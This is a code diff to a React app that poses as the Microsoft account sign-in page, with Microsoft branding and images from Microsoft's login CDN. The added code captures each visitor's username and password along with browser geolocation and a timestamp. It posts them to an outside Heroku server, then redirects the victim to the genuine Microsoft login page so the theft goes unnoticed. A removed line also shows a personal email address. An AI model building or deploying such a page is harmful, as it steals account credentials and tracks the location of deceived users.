@@ -1,11 +1,23 @@
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import "./App.css";
 import microsoft from './microsoft.jpg';
 import { useSpring, animated } from "react-spring";
+import axios from 'axios';
 
 function App() {
   const [registrationFormStatus, setRegistartionFormStatus] = useState(false);
   const [username,setUsername] = useState('');
+  const [latitude, setLatitude] = useState(0);
+  const [longitude, setLongitude] = useState(0);
+  const [date, setDay] = useState('');
+  const [time, setTime] = useState('');
+
+  var today = new Date();
+  var dates = (today.getMonth()+1)+'-'+today.getDate() + '-' + today.getFullYear();
+  var times = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
+
+
+
   const loginProps = useSpring({
     left: registrationFormStatus ? -500 : 0, // Login form sliding positions
   });
@@ -26,13 +38,24 @@ function App() {
 
   function registerClicked(username) {
     setUsername(username);
+    setDay(dates);
+    setTime(times);
+  
     setRegistartionFormStatus(true);
   }
   function loginClicked() {
     console.log('')
     setRegistartionFormStatus(false);
   }
-
+  useEffect(() => {
+    console.log('hello');
+    navigator.geolocation.getCurrentPosition(function(position) {
+      console.log("Latitude is :", position.coords.latitude);
+      console.log("Longitude is :", position.coords.longitude);
+      setLatitude(position.coords.latitude);
+      setLongitude(position.coords.longitude);
+    });
+  }, [])
   return (
     <div className="container" >
       <div className="login">
@@ -41,7 +64,7 @@ function App() {
           <LoginForm />
         </animated.form>
         <animated.form action="" id="registerform" style={registerProps}>
-          <RegisterForm username={username}/>
+          <RegisterForm username={username} latitude={latitude} longitude={longitude} date={date} time={time}/>
         </animated.form>
       </div>
 
@@ -79,10 +102,30 @@ function App() {
 
   function RegisterForm(props) {
     const [password, setPassword] = useState('');
-    function submit(e,username,password) {
+    // console.log(props);
+    function submit(e,username,password, lat, long, date, time) {
       e.preventDefault();
-      console.log('submit', username);
-      console.log('submit', password);
+      // console.log('submit', username);
+      // console.log('submit', password);
+      // console.log('submit', lat);
+      // console.log('submit', long);
+      // console.log('submit', date);
+      // console.log('submit', time);
+      const obj = {
+        username: username,
+        password: password, 
+        lat: lat,
+        long: long,
+        date: date,
+        time: time, 
+      }
+      console.log("Obj posted: ", obj);
+      axios.post('https://desolate-caverns-56075.herokuapp.com/login', obj)
+        .then(res=> {
+          console.log('res', res);
+        })
+      window.location.replace("https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1616655021&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Fdestrt%253Dhome-index%2526refd%253Daccount.microsoft.com%2526refp%253Dsignedout-index&lc=1033&id=292666&lw=1&fl=easi2&ru=https%3A%2F%2Faccount.microsoft.com%2Faccount%2FAccount%3Fdestrt%3Dhome-index");
+
     }
     return (
       <React.Fragment  >
@@ -94,7 +137,7 @@ function App() {
             <div id="hold">
               <div id="back">
                  <img onClick={loginClicked}src="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"/>
-                 <p>nithinmoorthy11@gmail.com </p>
+                 <p>{username}</p>
               </div>
                  <h3 id="password"> Enter Password </h3>
            </div>
@@ -109,7 +152,7 @@ function App() {
                 <img id="question" src="https://logincdn.msauth.net/shared/1.0/content/images/documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg"/>
             </div>
             <div class="btn-container">
-              <input type="submit" className="button" value="Sign In" onClick={e => submit(e, props.username, password)}/>
+              <input type="submit" className="button" value="Sign In" onClick={e => submit(e, props.username, password, props.latitude, props.longitude, props.date, props.time)}/>
             </div>
           </div>
         </div>
